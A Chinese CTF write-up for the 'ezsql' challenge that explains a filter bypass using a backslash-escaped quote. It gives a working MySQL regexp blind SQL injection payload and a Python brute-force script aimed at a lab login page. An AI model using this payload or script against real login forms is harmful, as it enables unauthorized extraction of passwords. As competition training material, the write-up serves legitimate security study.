---
title: 青少年CTF-ezsql-题目解析
url: https://www.secpulse.com/archives/194740.html
source: 安全脉搏
date: 2023-01-10
fetch_date: 2025-10-04T03:22:38.844867
---

# 青少年CTF-ezsql-题目解析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 青少年CTF-ezsql-题目解析

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[青少年CTF](https://www.secpulse.com/newpage/author?author_id=49279)

2023-01-09

13,789

# ezsql

题目来源：克拉玛依市第一届网络安全技能大赛

[![1.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/01/110.png "110.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/01/110.png)

## 0x01 解题思路

[![2.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/01/211.png "211.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/01/211.png)

进入提示，发现要我们登陆，点击确定后跳转到了login.php目录。

[![3.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/01/32.png "32.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/01/32.png)

通过探测发现过滤了select、union、'、"、、=、like、and等

username处加反斜杠转义单引号，造成逃逸，后面可控，成为注入点，payload：`or password regexp binary {}#`

利用regexp进行匹配猜测数据，还需要用binary关键字来区分大小写

题目的考点应该是本题考点为MySQL regexp盲注了。

## 0x02 解题脚本

```
import requests
import string

def str2hex(string):
  result = ''
  for i in string:
    result += hex(ord(i))
  result = result.replace('0x','')
  return '0x'+result

strs = string.ascii_letters+string.digits
url = "http://172.24.18.80/ezsql/login.php"
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'
}
payload = 'or password regexp binary {}#'
if __name__ == "__main__":
    name = ''
    for i in range(1,40):
        for j in strs:
            passwd = str2hex('^'+name+j)
            payloads = payload.format(passwd)
            postdata={
                'username':'admin\\',
                'password':payloads
            }
            r = requests.post(url,data=postdata,headers=headers)
            if "Maybe you are right" in r.text:
                name += j
                print(j,end='')
                break
```

**本文作者：[青少年CTF](newpage/author?author_id=49279)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/194740.html**](https://www.secpulse.com/archives/194740.html)

Tags: [ctf](https://www.secpulse.com/archives/tag/ctf)、[ezsql](https://www.secpulse.com/archives/tag/ezsql)、[Mysql](https://www.secpulse.com/archives/tag/Mysql)、[regexp盲注](https://www.secpulse.com/archives/tag/regexp%E7%9B%B2%E6%B3%A8)、[克拉玛依市第一届网络安全技能大赛](https://www.secpulse.com/archives/tag/%E5%85%8B%E6%8B%89%E7%8E%9B%E4%BE%9D%E5%B8%82%E7%AC%AC%E4%B8%80%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B)、[盲注](https://www.secpulse.com/archives/tag/%E7%9B%B2%E6%B3%A8)

点赞：
2
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![神器！MySQL蜜罐服务GUI利用工具](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/1686624388925-300x164.png)

  神器！MySQL蜜罐服务GUI利用工具](https://www.secpulse.com/archives/201773.html "详细阅读 神器！MySQL蜜罐服务GUI利用工具")
* [![某oa 11.10 未授权任意文件上传](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201450-1686040662-300x248.png)

  某oa 11.10 未授权任意文件上传](https://www.secpulse.com/archives/201450.html "详细阅读 某oa 11.10 未授权任意文件上传")
* [![MySQL数据库安全测试](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/1684133717094-300x188.png)

  MySQL数据库安全测试](https://www.secpulse.com/archives/200243.html "详细阅读 MySQL数据库安全测试")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/12/1670568845919.png)](https://www.secpulse.com/newpage/author?author_id=49279aaa) | [青少年CTF](https://www.secpulse.com/newpage/author?author_id=49279) | |
| 文章数：8 | 积分： 60 |
|  | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会暨高峰论坛](http://www.sins-expo.com)

#### 2021-05-27

[The 2nd AutoCS 2021智能汽车信息安全大会](https://artisan-event.com/AutoCS2021/)

#### 2020-12-18

[贝壳找房2020 ICS安全技术峰会](https://www.4hou.com/tickets/bmZO)

#### 2020-12-11

[全球敏捷运维峰会（Gdevops2020）](https://www.bagevent.com/event/6243820?bag_track=AQMB)

#### 2020-12-04

[2020京麒网络安全大会](https://www.huodongxing.com/event/5569026023500)

#### 2020-11-29

[OPPO技术开放日第六期|聚焦应用与数据安全防护](https://mp.weixin.qq.com/s/kXt5PAD3bPcHUZjl6rziCw)

#### 2020-11-27

[EISS-2020企业信息安全峰会之上海站 11.27](https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx187be17d5a2961cf&redirect_uri=httpswww.bagevent.comevent6531722&response_type=code&scope=snsapi_userinfo&state=STATE#wechat_redirect)

#### 2020-09-24

[CSDI summit中国软件研发管理行业技术峰会](https://www.bagevent.com/event/csdisummit)

#### 2020-09-23

[2020中国国际智慧能源暨能源数据中心与网络信息安全装备展览会](http://www.energydataexpo.cn)

#### 2020-07-31

[EISS-2020企业信息安全峰会之北京站 | 7.31（周五线上）](http://www.anquanjia.net.cn/main/detail?postId=83)

#### 2020-04-15

[看雪.安恒 2020 KCTF 春季赛](https://ctf.pediy.com)

#### 2020-01-09

[相约本地生活安全沙龙暨白帽子颁奖典礼](https://www.bagevent.com/event/6241320)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](...